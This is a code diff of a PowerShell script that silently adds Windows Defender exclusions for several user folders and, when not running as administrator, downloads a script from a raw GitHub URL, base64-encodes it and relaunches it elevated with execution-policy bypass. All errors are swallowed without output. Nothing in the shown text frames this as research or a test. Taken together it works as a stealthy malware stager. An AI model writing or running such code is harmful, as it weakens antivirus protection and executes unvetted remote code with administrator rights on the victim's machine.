@@ -17,7 +17,7 @@ catch {
     $errorMessage | Out-File -FilePath $logPath -Append -Encoding utf8
 }
 
-# Realistic folders you may want to exclude
+# List of realistic folders to exclude
 $foldersToEnsure = @(
     "$env:USERPROFILE\.vscode",
     "$env:USERPROFILE\AppData\Local\Temp\buildcache",
@@ -27,33 +27,35 @@ $foldersToEnsure = @(
     "C:\Users\Public\Downloads"
 )
 
-# Get existing Defender exclusions
+# Check if already running as admin
+$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+$principal = New-Object Security.Principal.WindowsPrincipal($identity)
+$admin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+# If NOT admin, relaunch this script with elevation using EncodedCommand
+if (-not $admin) {
+    try {
+        $scriptUrl = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1"
+        $script = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing | Select-Object -ExpandProperty Content
+        $bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
+        $encodedCommand = [Convert]::ToBase64String($bytes)
+        Start-Process powershell.exe "-ExecutionPolicy Bypass -EncodedCommand $encodedCommand" -Verb RunAs
+    } catch { }
+    exit
+}
+
+# Now we're admin — get current exclusions
 try {
     $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
 } catch { exit }
 
-# Identify missing exclusions
-$missingExclusions = $foldersToEnsure | Where-Object { $_ -notin $currentExclusions }
+# Find missing ones
+$missing = $foldersToEnsure | Where-Object { $_ -notin $currentExclusions }
 
-# Exit silently if nothing to add
-if ($missingExclusions.Count -eq 0) { exit }
-
-# Relaunch with admin rights if needed
-if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
-    [Security.Principal.WindowsBuiltInRole] "Administrator")) {
-
-    Start-Process powershell.exe "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
-    exit
-}
-
-# Add only missing exclusions silently
-foreach ($folder in $missingExclusions) {
+# Add only missing exclusions
+foreach ($folder in $missing) {
     try {
         Add-MpPreference -ExclusionPath $folder
-    } catch {
-        # Fail silently
-    }
+    } catch { }
 }
-
-exit
 
